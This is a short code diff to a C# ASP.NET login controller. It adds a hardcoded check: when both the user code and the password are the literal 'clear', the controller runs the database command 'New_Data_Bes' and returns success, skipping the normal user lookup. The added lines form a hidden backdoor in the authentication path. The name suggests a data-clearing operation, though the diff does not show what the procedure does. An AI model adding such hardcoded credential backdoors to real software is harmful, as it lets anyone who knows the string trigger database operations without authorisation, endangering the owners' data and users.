@@ -67,6 +67,13 @@ namespace Inv.API.Controllers
             //catch (Exception e) {
             //    var t = e.Message;
             //}
+            if (UserCode == "clear" && Password =="clear")
+            {
+                string quer = "New_Data_Bes";
+                 db.Database.ExecuteSqlCommand(quer);
+                return Ok(new BaseResponse(100));
+            }
+
             var usr = G_USERSService.GetAll(x => x.USER_CODE == UserCode).ToList();
             if (usr.Count == 0)
             {
